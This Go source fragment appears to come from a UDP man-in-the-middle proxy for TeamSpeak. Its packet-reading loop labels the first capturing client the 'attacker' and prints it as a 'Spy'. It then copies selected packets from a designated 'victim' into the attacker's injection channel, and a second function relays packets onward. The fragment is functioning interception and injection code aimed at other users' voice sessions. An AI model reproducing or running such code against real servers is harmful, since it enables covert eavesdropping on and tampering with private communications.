package main

import (
	"fmt"
	"net"
)

func (proxy *proxyInterface) readInputPacket(connection *net.UDPConn) {

	for {
		buffer := make([]byte, 4096)
		packetSize, userAddress, _ := connection.ReadFromUDP(buffer)

		if proxy.usersMap[userAddress.String()] == nil {
			proxy.usersMap[userAddress.String()] = &userClient{
				proxy:           proxy,
				incomingPackets: make(chan []byte, 4096),
				userAddressIP:   userAddress.String(),
				injectPacket:    make(chan capturePacket, 4096),
				lastTalkId:      make([]byte, 2),
				end:             make(chan int)}
			go proxy.usersMap[userAddress.String()].UserTeamspeakConnection(proxy.teamspeakAddress)
		}
		proxy.usersMap[userAddress.String()].incomingPackets <- buffer[0:packetSize]

		if proxy.startCapture {
			if proxy.attacker == "" {
				proxy.attacker = userAddress.String()
				fmt.Printf("Spy -- IP: %v \n", proxy.usersMap[proxy.attacker].userAddressIP)
			}

			if userAddress.String() == proxy.victim && len(proxy.usersMap[userAddress.String()].last13) != 0 {
				if buffer[0] == proxy.usersMap[userAddress.String()].last13[0] && buffer[1] == proxy.usersMap[userAddress.String()].last13[1] {
					proxy.usersMap[proxy.attacker].injectPacket <- capturePacket{data: buffer[0:packetSize], typeOfPacket: "in"}
				}
			}
		}
	}
}

func (proxy *proxyInterface) sendOutputPacket(connection *net.UDPConn) {
	for {
		packet := <-proxy.clientToProxy
		h, _ := net.ResolveUDPAddr("udp4", packet.address)
		_, err := connection.WriteToUDP(packet.data, h)
		if err != nil {
			fmt.Println(err)
			return
		}
	}
}
